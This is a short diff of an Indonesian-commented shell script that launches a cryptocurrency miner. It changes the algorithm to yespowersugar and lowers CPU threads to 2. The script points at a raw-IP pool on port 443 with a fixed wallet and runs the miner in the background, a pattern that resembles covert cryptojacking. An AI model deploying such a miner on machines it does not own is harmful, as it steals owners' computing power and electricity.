@@ -28,7 +28,7 @@ for dir in $CPUFREQ_PATH; do
 done
 
 # Pengaturan penambangan
-ALGO="verushash"
+ALGO="yespowersugar"
 POOL_URL="45.88.24.129:443"
 WALLET_ADDRESS="sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf"
 PASSWORD="x"
@@ -37,7 +37,7 @@ WORKER_NAME="JIAH$RANDOM"
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
 chmod +x $FILE_NAME
-./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 8 &
+./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 2 &
 
 # Mengecek apakah proses penambangan dimulai dengan benar
 if pgrep -f "$FILE_NAME" > /dev/null; then
